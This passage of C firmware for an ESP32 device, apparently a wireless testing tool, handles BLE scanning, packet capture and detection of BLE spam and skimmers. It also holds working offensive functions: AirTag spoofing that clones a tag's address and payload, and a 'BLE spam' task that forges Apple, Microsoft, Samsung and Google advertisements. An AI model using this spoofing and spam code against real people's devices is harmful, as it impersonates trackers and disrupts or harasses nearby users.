                    size_t copy_len = mfg_data_len;
                    if (copy_len > space - 2) copy_len = space - 2;
                    size_t shrink = (size_t)(base_shrink * attempt);
                    if (shrink >= copy_len) copy_len = 0;
                    else copy_len -= shrink;

                    if (copy_len > 0) {
                        tmp_buf[new_adv_len++] = (uint8_t)(copy_len + 1);
                        tmp_buf[new_adv_len++] = 0xFF;
                        memcpy(&tmp_buf[new_adv_len], mfg_data_start, copy_len);
                        new_adv_len += copy_len;
                    }
                }
            } else if (tag_to_spoof->payload_len > 2) {
                size_t space = sizeof(tmp_buf) - new_adv_len;
                size_t use = tag_to_spoof->payload_len - 2;
                if (use > space - 2) use = space - 2;
                size_t shrink = (size_t)(base_shrink * attempt);
                if (shrink >= use) use = 0;
                else use -= shrink;
                if (use > 0) {
                    tmp_buf[new_adv_len++] = (uint8_t)(use + 1);
                    tmp_buf[new_adv_len++] = 0xFF;
                    memcpy(&tmp_buf[new_adv_len], &tag_to_spoof->payload[2], use);
                    new_adv_len += use;
                }
            }

            size_t dump_len2 = new_adv_len < 16 ? new_adv_len : 16;
            char hdump2[3 * 16 + 1];
            for (size_t i = 0; i < dump_len2; i++) sprintf(&hdump2[i * 3], "%02X ", tmp_buf[i]);
            hdump2[dump_len2 * 3] = '\0';
            ESP_LOGI(TAG_BLE, "Retry %d: trying adv len=%zu data[0..%zu]=%s", attempt, new_adv_len, dump_len2, hdump2);

            if (ble_gap_adv_active()) {
                ble_gap_adv_stop();
                vTaskDelay(pdMS_TO_TICKS(20));
            }

            /* Clear previous data before retry setting new */
            (void)ble_gap_adv_set_data(NULL, 0);
            (void)ble_gap_adv_rsp_set_data(NULL, 0);
            vTaskDelay(pdMS_TO_TICKS(10));

            last_rc = ble_gap_adv_set_data(tmp_buf, new_adv_len);
            if (last_rc == 0) {
                /* success: copy tmp_buf into adv_buf for subsequent start */
                memcpy(adv_buf, tmp_buf, new_adv_len);
                adv_len = new_adv_len;
                rc = 0;
                break;
            }

            ESP_LOGW(TAG_BLE, "Retry %d ble_gap_adv_set_data failed rc=%d", attempt, last_rc);
        }

        if (last_rc != 0) {
            ESP_LOGE(TAG_BLE, "All retries failed setting adv data, giving up (last rc=%d)", last_rc);
            TERMINAL_VIEW_ADD_TEXT("Failed setting adv data after retries; rc=%d\n", last_rc);
            return;
        }
    }

    // Configure advertisement parameters
    memset(&adv_params, 0, sizeof adv_params);
    adv_params.conn_mode = BLE_GAP_CONN_MODE_NON; // Non-connectable
    adv_params.disc_mode = BLE_GAP_DISC_MODE_GEN; // General discoverable

    // Start advertising using the selected AirTag's address
    uint8_t own_addr_type;
    // Use the address type and value from the selected AirTag
    // We need to configure our device to use this specific address (Static Random or Public)
    // Note: Spoofing a Public address might be problematic/illegal depending on context.
    // AirTags typically use Random Static addresses.
    // Check the address type. We can usually only spoof Random addresses.
    if (tag_to_spoof->addr.type == BLE_ADDR_RANDOM) {
        uint8_t rnd_addr[6];
        memcpy(rnd_addr, tag_to_spoof->addr.val, 6);
        if ((rnd_addr[5] & 0xC0) == 0xC0) {
            rc = ble_hs_id_set_rnd(rnd_addr);
        } else {
            rnd_addr[5] = (rnd_addr[5] & 0x3F) | 0xC0;
            if ((rnd_addr[0] | rnd_addr[1] | rnd_addr[2] | rnd_addr[3] | rnd_addr[4] | (rnd_addr[5] & 0x3F)) == 0x00) {
                rnd_addr[0] = 0x01;
            }
            rc = ble_hs_id_set_rnd(rnd_addr);
        }
        if (rc != 0) {
            ESP_LOGE(TAG_BLE, "Failed to set random address for spoofing; rc=%d", rc);
            TERMINAL_VIEW_ADD_TEXT("Error: Failed set spoof rnd addr; rc=%d\n", rc);
            rc = ble_hs_id_infer_auto(0, &own_addr_type);
            if (rc != 0) {
                ESP_LOGE(TAG_BLE, "Error inferring own address; rc=%d", rc);
                TERMINAL_VIEW_ADD_TEXT("Error inferring own addr; rc=%d\n", rc);
                return;
            }
            ESP_LOGW(TAG_BLE, "Using default inferred address type %d", own_addr_type);
            TERMINAL_VIEW_ADD_TEXT("Warn: Using default address.\n");
        } else {
            own_addr_type = BLE_OWN_ADDR_RANDOM;
            ESP_LOGI(TAG_BLE, "Set random address successfully. Advertising with type %d", own_addr_type);
            TERMINAL_VIEW_ADD_TEXT("Using spoofed random address.\n");
        }
    } else {
        // We likely cannot spoof Public addresses this way.
        ESP_LOGW(TAG_BLE, "Cannot spoof non-random address type %d. Using default address.", tag_to_spoof->addr.type);
        TERMINAL_VIEW_ADD_TEXT("Warn: Cannot spoof addr type %d.\nUsing default address.\n", tag_to_spoof->addr.type);
        // Fallback to default address generation
        rc = ble_hs_id_infer_auto(0, &own_addr_type);
        if (rc != 0) {
            ESP_LOGE(TAG_BLE, "Error inferring own address; rc=%d", rc);
            TERMINAL_VIEW_ADD_TEXT("Error inferring own addr; rc=%d\n", rc);
            return;
        }
    }

    rc = ble_gap_adv_start(own_addr_type, NULL, BLE_HS_FOREVER, &adv_params, ble_gap_event_general, NULL);
    if (rc != 0) {
        ESP_LOGE(TAG_BLE, "Error starting spoofing advertisement; rc=%d", rc);
        TERMINAL_VIEW_ADD_TEXT("Error starting spoof adv; rc=%d\n", rc);
        return;
    }

    char macAddress[18];
    snprintf(macAddress, sizeof(macAddress), "%02x:%02x:%02x:%02x:%02x:%02x",
             tag_to_spoof->addr.val[0], tag_to_spoof->addr.val[1], tag_to_spoof->addr.val[2],
             tag_to_spoof->addr.val[3], tag_to_spoof->addr.val[4], tag_to_spoof->addr.val[5]);
    printf("Started spoofing AirTag %d (MAC: %s)\n", selected_airtag_index, macAddress);
    TERMINAL_VIEW_ADD_TEXT("Started spoofing AirTag %d\nMAC: %s\n", selected_airtag_index, macAddress);
    status_display_show_status("AirTag Spoof On");
    // Pulse green maybe?
    pulse_once(&rgb_manager, 0, 255, 0);
}

// Function to stop any ongoing spoofing advertisement
void ble_stop_spoofing(void) {
    if (ble_gap_adv_active()) {
        int rc = ble_gap_adv_stop();
        if (rc == 0) {
            glog("Stopped AirTag spoofing advertisement.\n");
            status_display_show_status("AirTag Spoof Off");
        } else {
            ESP_LOGE(TAG_BLE, "Error stopping spoofing advertisement; rc=%d", rc);
            glog("Error stopping spoof adv; rc=%d\n", rc);
            status_display_show_status("Spoof Stop Fail");
        }
        // Reset selected index after stopping spoof
        selected_airtag_index = -1;
    } else {
        glog("No spoofing advertisement active.\n");
        status_display_show_status("No Spoof Active");
    }
}

static bool wait_for_ble_ready(void) {
    int rc;
    int retry_count = 0;
    const int max_retries = 50; // 5 seconds total timeout

    while (!ble_stack_ready && !ble_hs_synced() && retry_count < max_retries) {
        vTaskDelay(pdMS_TO_TICKS(100)); // Wait for 100ms
        retry_count++;
    }

    if (!ble_stack_ready && !ble_hs_synced()) {
        ESP_LOGE(TAG_BLE, "Timeout waiting for BLE stack sync");
        return false;
    }

    if (ble_hs_synced()) {
        ble_stack_ready = true;
    }

    uint8_t own_addr_type;
    rc = ble_hs_id_infer_auto(0, &own_addr_type);
    if (rc != 0) {
        ESP_LOGE(TAG_BLE, "Failed to set BLE address");
        return false;
    }

    return true;
}

void ble_start_scanning(void) {
    if (!ble_initialized) {
        ble_init();
    }

    if (!wait_for_ble_ready()) {
        ESP_LOGE(TAG_BLE, "BLE stack not ready");
        TERMINAL_VIEW_ADD_TEXT("BLE stack not ready\n");
        status_display_show_status("BLE Not Ready");
        return;
    }

    struct ble_gap_disc_params disc_params = {0};
    disc_params.itvl = BLE_HCI_SCAN_ITVL_DEF;
    disc_params.window = BLE_HCI_SCAN_WINDOW_DEF;
    disc_params.filter_duplicates = 0;

    // Infer the correct own address type (Public or Random)
    uint8_t own_addr_type;
    int rc_addr = ble_hs_id_infer_auto(0, &own_addr_type);
    if (rc_addr != 0) {
        ESP_LOGE(TAG_BLE, "Failed to infer own address type: %d", rc_addr);
        own_addr_type = BLE_OWN_ADDR_PUBLIC; // Fallback
    }

    // Start a new BLE scan
    int rc = ble_gap_disc(own_addr_type, BLE_HS_FOREVER, &disc_params, ble_gap_event_general,
                          NULL);
    if (rc != 0) {
        ESP_LOGE(TAG_BLE, "Error starting BLE scan");
        TERMINAL_VIEW_ADD_TEXT("Error starting BLE scan\n");
        status_display_show_status("BLE Scan Fail");
    } else {
        ESP_LOGI(TAG_BLE, "Scanning started...");
        TERMINAL_VIEW_ADD_TEXT("Scanning started...\n");
        status_display_show_status("BLE Scanning");
    }
}

esp_err_t ble_register_handler(ble_data_handler_t handler) {
    if (handler_count >= MAX_HANDLERS) {
        return ESP_ERR_NO_MEM;
    }
    handlers[handler_count].handler = handler;
    handler_count++;
    return ESP_OK;
}

esp_err_t ble_unregister_handler(ble_data_handler_t handler) {
    for (int i = 0; i < handler_count; i++) {
        if (handlers[i].handler == handler) {
            for (int j = i; j < handler_count - 1; j++) {
                handlers[j] = handlers[j + 1];
            }
            handler_count--;
            return ESP_OK;
        }
    }

    return ESP_ERR_NOT_FOUND;
}

void ble_init(void) {
#ifndef CONFIG_IDF_TARGET_ESP32S2
    // --- pre-init ram check ---
    size_t free_internal = heap_caps_get_free_size(MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);
    size_t largest_internal = heap_caps_get_largest_free_block(MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);
    size_t free_psram = heap_caps_get_free_size(MALLOC_CAP_SPIRAM);
    size_t largest_psram = heap_caps_get_largest_free_block(MALLOC_CAP_SPIRAM);
    
    if (free_psram > 0) {
        ESP_LOGI(TAG_BLE, "pre-init ram: internal=%d bytes (largest block=%d), psram=%d bytes (largest block=%d)", 
                 (int)free_internal, (int)largest_internal, (int)free_psram, (int)largest_psram);
        TERMINAL_VIEW_ADD_TEXT("pre-init ram: internal=%d bytes (largest=%d), psram=%d bytes (largest=%d)\n", 
                               (int)free_internal, (int)largest_internal, (int)free_psram, (int)largest_psram);
    } else {
        ESP_LOGI(TAG_BLE, "pre-init ram: internal=%d bytes (largest block=%d), no psram", 
                 (int)free_internal, (int)largest_internal);
        TERMINAL_VIEW_ADD_TEXT("pre-init ram: internal=%d bytes (largest=%d), no psram\n", 
                               (int)free_internal, (int)largest_internal);
    }
    
    // --- Memory check before BLE init ---
    size_t free_heap = heap_caps_get_free_size(MALLOC_CAP_8BIT);
    if (free_heap < (45 * 1024)) {
        ESP_LOGW(TAG_BLE, "WARNING: Less than 45KB of free RAM available (%d bytes). BLE may fail to initialize!", (int)free_heap);
        TERMINAL_VIEW_ADD_TEXT("WARNING: <45KB RAM free (%d bytes). BLE may not initialize!\n", (int)free_heap);
    }

    if (!ble_initialized) {
        ble_stack_ready = false;
        esp_err_t ret = nvs_flash_init();
        if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
            // NVS partition was truncated and needs to be erased
            ESP_ERROR_CHECK(nvs_flash_erase());
            ret = nvs_flash_init();
        }
        ESP_ERROR_CHECK(ret);

        ble_suspend_networking();

        memset(handlers, 0, sizeof(handlers));
        handler_count = 0;

        // Release Classic BT controller memory on non-ESP32 targets too to free RAM for NimBLE
        // Safe to call multiple times; ignore return if already released
        (void)esp_bt_controller_mem_release(ESP_BT_MODE_CLASSIC_BT);

        // log DMA-capable internal heap info right before NimBLE init
        size_t free_internal_dma = heap_caps_get_free_size(MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT | MALLOC_CAP_DMA);
        size_t largest_internal_dma = heap_caps_get_largest_free_block(MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT | MALLOC_CAP_DMA);
        ESP_LOGI(TAG_BLE, "pre-init dma-ram: free=%d bytes (largest block=%d)", (int)free_internal_dma, (int)largest_internal_dma);
        TERMINAL_VIEW_ADD_TEXT("pre-init dma-ram: free=%d bytes (largest=%d)\n", (int)free_internal_dma, (int)largest_internal_dma);

        ble_prepare_hs_config();
        ret = nimble_port_init();
        if (ret != 0) {
            ESP_LOGE(TAG_BLE, "Failed to init nimble port: %d", ret);
            ESP_LOGI(TAG_BLE, "Dumping DMA-capable heap info after failure");
            size_t free_dma_after = heap_caps_get_free_size(MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT | MALLOC_CAP_DMA);
            size_t largest_dma_after = heap_caps_get_largest_free_block(MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT | MALLOC_CAP_DMA);
            ESP_LOGI(TAG_BLE, "post-fail dma-ram: free=%d bytes (largest block=%d)", (int)free_dma_after, (int)largest_dma_after);
            ble_resume_networking();
            return;
        }

        // Configure and start the NimBLE host task (larger stack to avoid overflow on S3)
        xTaskCreate(nimble_host_task, "nimble_host", NIMBLE_HOST_TASK_STACK_SIZE, NULL, 5, &nimble_host_task_handle);
        
        // Wait for NimBLE stack to be ready
        vTaskDelay(pdMS_TO_TICKS(100));
        
        ESP_LOGI(TAG_BLE, "BLE configured for random address support");

        ble_initialized = true;
        ESP_LOGI(TAG_BLE, "BLE initialized");
        TERMINAL_VIEW_ADD_TEXT("BLE initialized\n");
    }
#endif
}

void ble_start_find_flippers(void) {
    if (!ble_initialized) {
        ble_init();
    }

    memset(discovered_flippers, 0, sizeof(discovered_flippers));
    discovered_flipper_count = 0;
    selected_flipper_index = -1;

    ESP_LOGI(TAG_BLE, "Find Flippers: registering handler and starting BLE scan");
    ble_register_handler(ble_findtheflippers_callback);
    ble_start_scanning();
}

void ble_deinit(void) {
    if (ble_initialized) {
        handler_count = 0;

        // Stop NimBLE host and wait for the host task to exit
        nimble_port_stop();
        if (nimble_host_task_handle != NULL) {
            int wait_iterations = 0;
            // Give the host task time to exit gracefully
            while (eTaskGetState(nimble_host_task_handle) != eDeleted && wait_iterations < 25) {
                vTaskDelay(pdMS_TO_TICKS(20));
                wait_iterations++;
            }
            // If it still hasn't exited, force-delete it
            if (eTaskGetState(nimble_host_task_handle) != eDeleted) {
                vTaskDelete(nimble_host_task_handle);
                vTaskDelay(pdMS_TO_TICKS(10));
            }
            nimble_host_task_handle = NULL;
        }
        // Now deinitialize the NimBLE port (controller + host deinit)
        nimble_port_deinit();

        ble_stack_ready = false;
        ble_initialized = false;
        ESP_LOGI(TAG_BLE, "BLE deinitialized successfully.");
        TERMINAL_VIEW_ADD_TEXT("BLE deinitialized successfully.\n");

        ble_resume_networking();
    }
}

void ble_stop(void) {
    if (!ble_initialized) {
        return;
    }

    if (!ble_gap_disc_active()) {
        return;
    }

    status_display_show_status("BLE Stopping");

    last_company_id_valid = false;

    // Stop and delete the flush timer if it exists
    if (flush_timer != NULL) {
        esp_timer_stop(flush_timer);
        esp_timer_delete(flush_timer);
        flush_timer = NULL;
    }

    rgb_manager_set_color(&rgb_manager, 0, 0, 0, 0, false);
    ble_unregister_handler(ble_findtheflippers_callback);
    ble_unregister_handler(airtag_scanner_callback);
    ble_unregister_handler(ble_print_raw_packet_callback);
    ble_unregister_handler(detect_ble_spam_callback);
    pcap_flush_buffer_to_file(); // Final flush
    pcap_file_close();           // Close the file after final flush

    /* final capture summary */
    glog("BLE capture summary: captured=%lu filtered=%lu total=%lu\n",
         (unsigned long)ble_pcap_packet_count,
         (unsigned long)((ble_pcap_event_total_count > ble_pcap_packet_count) ? (ble_pcap_event_total_count - ble_pcap_packet_count) : 0),
         (unsigned long)ble_pcap_event_total_count);
    /* reset counters for next capture */
    ble_pcap_packet_count = 0;
    ble_pcap_event_total_count = 0;

    // Stop spoofing if it was active
    ble_stop_spoofing();

    int rc = ble_gap_disc_cancel();

    switch (rc) {
    case 0:
        glog("BLE scan stopped successfully.\n");
        status_display_show_status("BLE Stopped");
        break;
    case BLE_HS_EBUSY:
        glog("BLE scan is busy\n");
        status_display_show_status("BLE Busy");
        break;
    case BLE_HS_ETIMEOUT:
        glog("BLE operation timed out.\n");
        status_display_show_status("BLE Timeout");
        break;
    case BLE_HS_ENOTCONN:
        glog("BLE not connected.\n");
        status_display_show_status("BLE No Conn");
        break;
    case BLE_HS_EINVAL:
        glog("BLE invalid parameter.\n");
        status_display_show_status("BLE Invalid");
        break;
    default:
        glog("Error stopping BLE scan: %d\n", rc);
        status_display_show_status("BLE Stop Fail");
    }

    ble_deinit();
}

void ble_start_blespam_detector(void) {
    if (!ble_initialized) {
        ble_init();
    }

    ble_start_scanning();
    ble_register_handler(detect_ble_spam_callback);
}

void ble_start_raw_ble_packetscan(void) {
    if (!ble_initialized) {
        ble_init();
    }

    ble_start_scanning();
    ble_register_handler(ble_print_raw_packet_callback);
}

void ble_start_airtag_scanner(void) {
    ESP_LOGI(TAG_BLE, "Starting AirTag scanner: active scan, duplicates allowed, larger window");

    memset(discovered_airtags, 0, sizeof(discovered_airtags));
    memset(airtag_last_rssi_log, 0, sizeof(airtag_last_rssi_log));
    discovered_airtag_count = 0;
    selected_airtag_index = -1;
    airTagCount = 0;

    if (!ble_initialized) {
        ble_init();
    }

    if (!wait_for_ble_ready()) {
        ESP_LOGE(TAG_BLE, "BLE stack not ready for AirTag scanner");
        return;
    }

    ble_register_handler(airtag_scanner_callback);

    struct ble_gap_disc_params disc_params = {0};
    disc_params.itvl = 0x30; // ~30ms (0.625ms units)
    disc_params.window = 0x30; // full window to increase listen time
    disc_params.filter_policy = 0; // accept all
    disc_params.limited = 0;
    disc_params.passive = 0; // active scanning (send scan requests to match Arduino/NimBLE behavior)
    disc_params.filter_duplicates = 0; // deliver duplicates
    disc_params.disable_observer_mode = 0;

    // Infer address type
    uint8_t own_addr_type;
    int rc_addr = ble_hs_id_infer_auto(0, &own_addr_type);
    if (rc_addr != 0) {
        ESP_LOGE(TAG_BLE, "Failed to infer own address type: %d", rc_addr);
        own_addr_type = BLE_OWN_ADDR_PUBLIC; // Fallback
    }

    int rc = ble_gap_disc(own_addr_type, BLE_HS_FOREVER, &disc_params, ble_gap_event_general, NULL);
    if (rc != 0) {
        ESP_LOGE(TAG_BLE, "Error starting AirTag BLE scan; rc=%d", rc);
        TERMINAL_VIEW_ADD_TEXT("Error starting AirTag scan\n");
    } else {
        ESP_LOGI(TAG_BLE, "AirTag scanning started");
    }
}

static void ble_pcap_callback(struct ble_gap_event *event, size_t len) {
    if (!event || len == 0)
        return;

    /* count every callback event we receive for filtering stats */
    ble_pcap_event_total_count++;

    uint8_t hci_buffer[258]; // Max HCI packet size
    size_t hci_len = 0;

    if (event->type == BLE_GAP_EVENT_DISC) {
        // [1] HCI packet type (0x04 for HCI Event)
        hci_buffer[0] = 0x04;

        // [2] HCI Event Code (0x3E for LE Meta Event)
        hci_buffer[1] = 0x3E;

        // [3] Calculate total parameter length
        uint8_t param_len = 10 + event->disc.length_data; // 1 (subevent) + 1 (num reports) + 1
                                                          // (event type) + 1 (addr type) + 6 (addr)
        hci_buffer[2] = param_len;

        // [4] LE Meta Subevent (0x02 for LE Advertising Report)
        hci_buffer[3] = 0x02;

        // [5] Number of reports
        hci_buffer[4] = 0x01;

        // [6] Event type (ADV_IND = 0x00)
        hci_buffer[5] = 0x00;

        // [7] Address type
        hci_buffer[6] = event->disc.addr.type;

        // [8] Address (6 bytes)
        memcpy(&hci_buffer[7], event->disc.addr.val, 6);

        // [9] Data length
        hci_buffer[13] = event->disc.length_data;

        // [10] Data
        if (event->disc.length_data > 0) {
            memcpy(&hci_buffer[14], event->disc.data, event->disc.length_data);
        }

        // [11] RSSI
        hci_buffer[14 + event->disc.length_data] = (uint8_t)event->disc.rssi;

        hci_len = 15 + event->disc.length_data; // Total length

        /* keep a lightweight counter and occasionally report a summary */

        ble_pcap_packet_count++;
        if ((ble_pcap_packet_count % 50) == 0) {
            uint32_t filtered = ble_pcap_event_total_count - ble_pcap_packet_count;
            glog("BLE: %lu packets captured, %lu filtered (total events %lu)\n",
                 (unsigned long)ble_pcap_packet_count, (unsigned long)filtered, (unsigned long)ble_pcap_event_total_count);
        }

        pcap_write_packet_to_buffer(hci_buffer, hci_len, PCAP_CAPTURE_BLUETOOTH);
    }
}

void ble_start_capture(void) {
    /* ensure BLE stack is initialized and ready before opening PCAP and
       starting scanning; avoids leaving a file open if scan fails */
    if (!ble_initialized) {
        ble_init();
    }

    if (!wait_for_ble_ready()) {
        ESP_LOGE(TAG_BLE, "BLE stack not ready");
        TERMINAL_VIEW_ADD_TEXT("BLE stack not ready\n");
        return;
    }

    /* reset counters for a fresh capture session */
    ble_pcap_packet_count = 0;
    ble_pcap_event_total_count = 0;

    // Open PCAP file first
    esp_err_t err = pcap_file_open("ble_capture", PCAP_CAPTURE_BLUETOOTH);
    if (err != ESP_OK) {
        ESP_LOGE("BLE_PCAP", "Failed to open PCAP file");
        return;
    }

    // Register BLE handler only after file is open
    ble_register_handler(ble_pcap_callback);

    // Create a timer to flush the buffer periodically
    esp_timer_create_args_t timer_args = {.callback = (esp_timer_cb_t)pcap_flush_buffer_to_file,
                                          .name = "pcap_flush"};

    if (esp_timer_create(&timer_args, &flush_timer) == ESP_OK) {
        esp_timer_start_periodic(flush_timer, 1000000); // Flush every second
    }

    ble_start_scanning();
    status_display_show_status("BLE Capture On");
}

void ble_start_skimmer_detection(void) {
    // Register the skimmer detection callback
    esp_err_t err = ble_register_handler(ble_skimmer_scan_callback);
    if (err != ESP_OK) {
        ESP_LOGE("BLE", "Failed to register skimmer detection callback");
        return;
    }

    // Start BLE scanning
    ble_start_scanning();
}

// Function to list discovered Flippers
void ble_list_flippers(void) {
    glog("--- Discovered Flippers (%d) ---\n", discovered_flipper_count);
    if (discovered_flipper_count == 0) {
        glog("No Flippers discovered yet.\n");
        return;
    }

    for (int i = 0; i < discovered_flipper_count; i++) {
        char mac[18];
        snprintf(mac, sizeof(mac), "%02x:%02x:%02x:%02x:%02x:%02x",
                 discovered_flippers[i].addr.val[0], discovered_flippers[i].addr.val[1],
                 discovered_flippers[i].addr.val[2], discovered_flippers[i].addr.val[3],
                 discovered_flippers[i].addr.val[4], discovered_flippers[i].addr.val[5]);
        glog("Index: %d | MAC: %s | RSSI: %d dBm%s\n",
             i, mac, discovered_flippers[i].rssi,
             (i == selected_flipper_index) ? " (Selected)" : "");
    }
}
void ble_start_tracking_selected_flipper(void) {
    // Stop any ongoing scan
    ble_gap_disc_cancel();
    // Re-register callback (ensuring no duplicates)
    ble_unregister_handler(ble_findtheflippers_callback);
    ble_register_handler(ble_findtheflippers_callback);
    struct ble_gap_disc_params params = {0};
    params.itvl = BLE_HCI_SCAN_ITVL_DEF;
    params.window = BLE_HCI_SCAN_WINDOW_DEF;
    params.filter_duplicates = 0; // receive all advertisement updates

    uint8_t own_addr_type;
    if (ble_hs_id_infer_auto(0, &own_addr_type) != 0) {
        own_addr_type = BLE_OWN_ADDR_PUBLIC;
    }

    int rc = ble_gap_disc(own_addr_type, BLE_HS_FOREVER, &params, ble_gap_event_general, NULL);
    if (rc != 0) {
        glog("Error starting tracker; rc=%d\n", rc);
    }
}
void ble_select_flipper(int index) {
    if (index < 0 || index >= discovered_flipper_count) {
        glog("Error: Invalid Flipper index %d. Use 'listflippers' to see valid indices.\n", index);
        selected_flipper_index = -1;
        return;
    }

    selected_flipper_index = index;
    char mac[18];
    snprintf(mac, sizeof(mac), "%02x:%02x:%02x:%02x:%02x:%02x",
             discovered_flippers[index].addr.val[0], discovered_flippers[index].addr.val[1],
             discovered_flippers[index].addr.val[2], discovered_flippers[index].addr.val[3],
             discovered_flippers[index].addr.val[4], discovered_flippers[index].addr.val[5]);
    glog("Selected Flipper at index %d: MAC %s\n", index, mac);
    // Start continuous tracking scan without duplicate filtering
    ble_start_tracking_selected_flipper();
    glog("Started tracking Flipper %d...\n", index);
}

static void build_microsoft_mfg(const char *name, uint8_t *buf, size_t *len) {
    size_t name_len = strlen(name);
    buf[0] = 0x06;
    buf[1] = 0x00;
    buf[2] = 0x03;
    buf[3] = 0x00;
    buf[4] = 0x80;
    memcpy(&buf[5], name, name_len);
    *len = 5 + name_len;
}

static void build_apple_mfg(uint8_t *buf, size_t *len) {
    buf[0] = 0x4C;
    buf[1] = 0x00;
    buf[2] = 0x0F;
    buf[3] = 0x05;
    buf[4] = 0xC1;
    
    int use_ios2 = esp_random() % 2;
    if (use_ios2) {
        buf[5] = IOS2[esp_random() % (sizeof(IOS2)/sizeof(IOS2[0]))];
    } else {
        buf[5] = IOS1[esp_random() % (sizeof(IOS1)/sizeof(IOS1[0]))];
    }
    
    esp_fill_random(&buf[6], 3);
    buf[9] = 0x00;
    buf[10] = 0x00;
    buf[11] = 0x10;
    esp_fill_random(&buf[12], 3);
    *len = 15;
}

static void build_samsung_mfg(uint8_t *buf, size_t *len) {
    buf[0] = 0x75;
    buf[1] = 0x00;
    buf[2] = 0x01;
    buf[3] = 0x00;
    buf[4] = 0x02;
    buf[5] = 0x00;
    buf[6] = 0x01;
    buf[7] = 0x01;
    buf[8] = 0xFF;
    buf[9] = 0x00;
    buf[10] = 0x00;
    buf[11] = 0x43;
    uint8_t model = watch_models[esp_random() % (sizeof(watch_models)/sizeof(watch_models[0]))].value;
    buf[12] = model;
    *len = 13;
}

static void build_google_mfg(uint8_t *buf, size_t *len) {
    uint32_t device_id = android_models[esp_random() % (sizeof(android_models)/sizeof(android_models[0]))].value;
    buf[0] = 0xE0;
    buf[1] = 0x00;
    buf[2] = 0x00;
    buf[3] = (device_id >> 16) & 0xFF;
    buf[4] = (device_id >> 8) & 0xFF;
    buf[5] = device_id & 0xFF;
    buf[6] = (esp_random() % 120) - 100;
    *len = 7;
}

void ble_start_ble_spam(ble_spam_type_t type) {
    if (spam_running) {
        printf("spam already running, stopping first...\n");
        ble_stop_ble_spam();
        vTaskDelay(pdMS_TO_TICKS(500));
    }

    if (spam_task_handle != NULL) {
        printf("cleaning up previous spam task...\n");
        if (eTaskGetState(spam_task_handle) != eDeleted) {
            vTaskDelete(spam_task_handle);
        }
        spam_task_handle = NULL;
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    if (!ble_initialized) {
        ble_init();
    }

    if (!wait_for_ble_ready()) {
        printf("ble not ready for spam\n");
        return;
    }

    current_spam_type = type;
    spam_adv_count = 0;
    spam_running = true;

    BaseType_t task_result = xTaskCreate(spam_task, "ble_spam", 4096, NULL, 5, &spam_task_handle);
    if (task_result != pdPASS) {
        printf("failed to create spam task (error: %d)\n", task_result);
        if (task_result == errCOULD_NOT_ALLOCATE_REQUIRED_MEMORY) {
            printf("insufficient memory for spam task\n");
        }
        spam_running = false;
        spam_task_handle = NULL;
        return;
    }

    if (spam_log_timer == NULL) {
        esp_timer_create_args_t targs = {
            .callback = spam_log_timer_cb,
            .arg = NULL,
            .name = "spam_log"
        };
        esp_err_t timer_result = esp_timer_create(&targs, &spam_log_timer);
        if (timer_result != ESP_OK) {
            printf("failed to create spam log timer (error: %d)\n", timer_result);
        }
    }
    
    if (spam_log_timer != NULL) {
        esp_timer_start_periodic(spam_log_timer, spam_log_interval_ms * 1000);
    }

    const char *type_name = "unknown";
    switch (type) {
        case BLE_SPAM_APPLE: type_name = "apple"; break;
        case BLE_SPAM_MICROSOFT: type_name = "microsoft"; break;
        case BLE_SPAM_SAMSUNG: type_name = "samsung"; break;
        case BLE_SPAM_GOOGLE: type_name = "google"; break;
        case BLE_SPAM_RANDOM: type_name = "random"; break;
        case BLE_SPAM_FLIPPERZERO: type_name = "flipper"; break;
    }
    printf("ble spam advertising started (%s)\n", type_name);
    status_display_show_status("BLE Spam On");
}

void ble_stop_ble_spam(void) {
    if (!spam_running) {
        return;
    }
    
    spam_running = false;
    
    if (spam_task_handle != NULL) {
        vTaskDelay(pdMS_TO_TICKS(500));
        
        if (eTaskGetState(spam_task_handle) != eDeleted) {
            vTaskDelete(spam_task_handle);
        }
        spam_task_handle = NULL;
    }
    
    if (spam_log_timer) {
        esp_timer_stop(spam_log_timer);
    }
    
    if (ble_gap_adv_active()) {
        ble_gap_adv_stop();
    }
    
    printf("ble spam advertising stopped\n");
    status_display_show_status("BLE Spam Off");
}

#endif